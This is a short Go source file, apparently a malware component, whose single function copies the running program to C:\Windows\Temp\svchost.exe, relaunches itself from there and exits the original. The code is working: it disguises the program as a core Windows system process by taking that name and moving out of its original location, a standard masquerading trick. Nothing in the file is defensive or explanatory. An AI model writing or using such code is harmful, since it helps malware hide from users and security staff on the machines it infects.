package svchost

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func Writer() {
	// Define the target path where we want our executable to be
	targetPath := `C:\Windows\Temp\svchost.exe`

	// Get the current executable path
	currentExePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting current executable path:", err)
		return
	}

	// Convert paths to lowercase for case-insensitive comparison (Windows paths)
	currentPathLower := strings.ToLower(currentExePath)
	targetPathLower := strings.ToLower(targetPath)

	// Check if we're already running from the target location
	if currentPathLower == targetPathLower {
		fmt.Println("Running from the correct location:", targetPath)
		return
	}

	// If we're not at the target location, we need to copy ourselves there
	fmt.Println("Not running from target location.")
	fmt.Println("Current location:", currentExePath)
	fmt.Println("Target location:", targetPath)

	// Create the target directory if it doesn't exist
	targetDir := filepath.Dir(targetPath)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		fmt.Println("Error creating target directory:", err)
		return
	}

	// Open the current executable for reading
	fmt.Println("Reading contents of current executable...")
	sourceFile, err := os.Open(currentExePath)
	if err != nil {
		fmt.Println("Error opening source file:", err)
		return
	}
	defer sourceFile.Close()

	// Create the target file for writing
	fmt.Println("Creating target file:", targetPath)
	targetFile, err := os.Create(targetPath)
	if err != nil {
		fmt.Println("Error creating target file:", err)
		return
	}
	defer targetFile.Close()

	// Copy the executable
	fmt.Println("Copying executable to target location...")
	_, err = io.Copy(targetFile, sourceFile)
	if err != nil {
		fmt.Println("Error copying file:", err)
		return
	}

	// Make sure the file is closed before executing it
	targetFile.Close()

	// Execute the new copy
	fmt.Println("Launching new process from:", targetPath)
	cmd := exec.Command(targetPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting new process:", err)
		return
	}

	fmt.Println("New process started. Terminating current process.")
	// Exit the current process
	os.Exit(0)
}
